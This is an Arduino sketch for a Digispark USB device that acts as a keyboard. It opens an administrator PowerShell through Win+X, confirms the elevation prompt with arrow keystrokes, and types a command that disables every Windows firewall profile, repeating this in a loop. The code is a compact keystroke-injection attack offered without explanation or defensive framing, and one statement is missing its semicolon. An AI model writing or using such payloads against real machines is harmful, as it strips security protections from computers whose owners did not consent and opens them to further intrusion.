#include "DigiKeyboard.h"
#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F

void setup() {
  //empty
}
void loop() {
    DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_X);
	DigiKeyboard.delay(500);
	DigiKeyboard.print("A");
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(5000);
	DigiKeyboard.print("Set-NetFirewallProfile -Enabled False")
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}